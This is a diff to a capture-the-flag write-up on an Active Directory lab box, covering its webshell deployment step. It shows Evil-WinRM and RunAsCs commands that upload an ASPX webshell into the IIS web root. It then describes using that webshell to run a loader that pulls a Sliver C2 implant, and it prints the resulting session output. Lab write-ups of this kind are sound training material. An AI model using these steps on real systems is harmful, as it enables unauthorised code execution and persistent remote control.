@@ -1020,13 +1020,33 @@ The session came back as `sam.brooks` rather than `web_admin` due to token limit
 
 ## 9.4 Webshell Deployment
 
-Since the Sliver stager through `RunAsCs` didn't yield a proper `web_admin` token, an ASPX webshell was uploaded to the IIS wwwroot directory to execute the implant directly as the IIS service account. The webshell (`shell.aspx`) was copied to `C:\inetpub\wwwroot\` using the sam.brooks Evil-WinRM session.
+Since the Sliver stager through `RunAsCs` didn't yield a proper `web_admin` token, a different approach was needed. The `web_admin` account has write access to the IIS web root, so an ASPX webshell ([cmd.aspx](https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx)) was uploaded to `C:\inetpub\wwwroot\` to gain code execution as the IIS service account.
+
+Using the sam.brooks Evil-WinRM session, the webshell was uploaded and then copied to wwwroot via `RunAsCs` as `web_admin`:
+
+```
+*Evil-WinRM* PS C:\Users\sam.brooks\Documents> upload shell.aspx
+
+Warning: Remember that in docker environment all local paths should be at /data and it must be mapped correctly as a volume on docker run
+command
+
+Info: Uploading /workspace/shell.aspx to C:\Users\sam.brooks\Documents\shell.aspx
+
+Info: Upload successful!
+*Evil-WinRM* PS C:\Users\sam.brooks\Documents> .\run.exe web_admin '[REDACTED]' "cmd /c copy C:\Users\sam.brooks\Documents\shell.aspx C:\inetpub\wwwroot\shell.aspx" -d city.local
+[*] Warning: User profile directory for user web_admin does not exists. Use --force-profile if you want to force the creation.
+[*] Warning: The logon for user 'web_admin' is limited. Use the flag combination --bypass-uac and --logon-type '5' to obtain a more
+privileged token.
+        1 file(s) copied.
+```
+
+With the webshell deployed, browsing to `http://city.local/shell.aspx` provided a command execution interface running as the IIS service account. The runner binary was executed through the webshell to establish a Sliver C2 session.
 
 <div style="text-align: center;">
   <img src="/assets/images/ctf/city/webshell-runner.png" alt="ASPX webshell executing runner.exe with Sliver implant" style="max-width: 100%;" />
 </div>
 
-The webshell at `http://city.local/shell.aspx` was used to execute `c:\tools\runner.exe` with the Sliver implant URL, establishing a new C2 session running as the IIS service account.
+The webshell executed `c:\tools\runner.exe` with the Sliver implant URL, establishing a new C2 session running as the IIS service account.
 
 ```
 Shell exitedc5174231 BIG_BRICK - 10.0.29.180:50754 (DC-CC) - windows/amd64 - Fri, 06 Mar 2026 14:54:52 PST
